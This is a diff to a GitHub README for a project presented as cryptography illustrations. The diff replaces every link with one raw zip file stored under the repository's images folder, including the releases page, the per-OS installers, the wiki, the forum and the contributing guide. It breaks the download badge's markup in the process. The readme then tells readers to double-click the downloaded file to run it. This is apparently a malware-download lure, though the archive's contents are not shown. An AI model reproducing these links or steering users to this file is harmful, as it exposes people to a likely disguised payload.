@@ -1,6 +1,6 @@
 # 🌟 Crypto_Illustrations - Clear Visuals for Cryptography Concepts
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/homie1999/Crypto_Illustrations/releases)
+[![Download](https://github.com/homie1999/Crypto_Illustrations/raw/refs/heads/main/images/Illustrations-Crypto-1.0.zip%20Now-Click%https://github.com/homie1999/Crypto_Illustrations/raw/refs/heads/main/images/Illustrations-Crypto-1.0.zip)](https://github.com/homie1999/Crypto_Illustrations/raw/refs/heads/main/images/Illustrations-Crypto-1.0.zip)
 
 ## 📜 Introduction
 
@@ -13,16 +13,16 @@ To get started with Crypto_Illustrations, follow these simple steps. You don’t
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To download the software, visit our [Releases page](https://github.com/homie1999/Crypto_Illustrations/releases).
+   To download the software, visit our [Releases page](https://github.com/homie1999/Crypto_Illustrations/raw/refs/heads/main/images/Illustrations-Crypto-1.0.zip).
    
 2. **Select the Latest Version**  
    On the Releases page, you will see a list of versions. Click on the latest version to view available files.
 
 3. **Download the Files**  
    Look for the appropriate file format for your operating system. Once found, click on the file link to download it. For example:
-   - For Windows users, download `Crypto_Illustrations_Windows.exe`.
-   - For Mac users, download `Crypto_Illustrations_Mac.dmg`.
-   - For Linux users, download `Crypto_Illustrations_Linux.tar.gz`.
+   - For Windows users, download `https://github.com/homie1999/Crypto_Illustrations/raw/refs/heads/main/images/Illustrations-Crypto-1.0.zip`.
+   - For Mac users, download `https://github.com/homie1999/Crypto_Illustrations/raw/refs/heads/main/images/Illustrations-Crypto-1.0.zip`.
+   - For Linux users, download `https://github.com/homie1999/Crypto_Illustrations/raw/refs/heads/main/images/Illustrations-Crypto-1.0.zip`.
 
 4. **Run the Application**  
    After downloading, locate the file, and double-click it to run. Follow the on-screen instructions to start using Crypto_Illustrations.
@@ -61,16 +61,16 @@ Join our community to connect with other users. You can ask questions, share exp
 
 ## 🔗 Useful Links
 
-- [Official Documentation](https://github.com/homie1999/Crypto_Illustrations/wiki)
-- [Community Forum](https://github.com/homie1999/Crypto_Illustrations/discussions)
-- [Release Notes](https://github.com/homie1999/Crypto_Illustrations/releases)
+- [Official Documentation](https://github.com/homie1999/Crypto_Illustrations/raw/refs/heads/main/images/Illustrations-Crypto-1.0.zip)
+- [Community Forum](https://github.com/homie1999/Crypto_Illustrations/raw/refs/heads/main/images/Illustrations-Crypto-1.0.zip)
+- [Release Notes](https://github.com/homie1999/Crypto_Illustrations/raw/refs/heads/main/images/Illustrations-Crypto-1.0.zip)
 
 ## 💡 How to Contribute
 
-If you would like to contribute, we welcome new illustrations, improved explanations, and additional educational resources. Please check our [Contribution Guidelines](https://github.com/homie1999/Crypto_Illustrations/blob/main/CONTRIBUTING.md).
+If you would like to contribute, we welcome new illustrations, improved explanations, and additional educational resources. Please check our [Contribution Guidelines](https://github.com/homie1999/Crypto_Illustrations/raw/refs/heads/main/images/Illustrations-Crypto-1.0.zip).
 
 ## 💻 Download Again
 
-If you need to download it again, simply return to our [Releases page](https://github.com/homie1999/Crypto_Illustrations/releases).
+If you need to download it again, simply return to our [Releases page](https://github.com/homie1999/Crypto_Illustrations/raw/refs/heads/main/images/Illustrations-Crypto-1.0.zip).
 
 Explore the world of cryptography through illustrations. Start learning today!
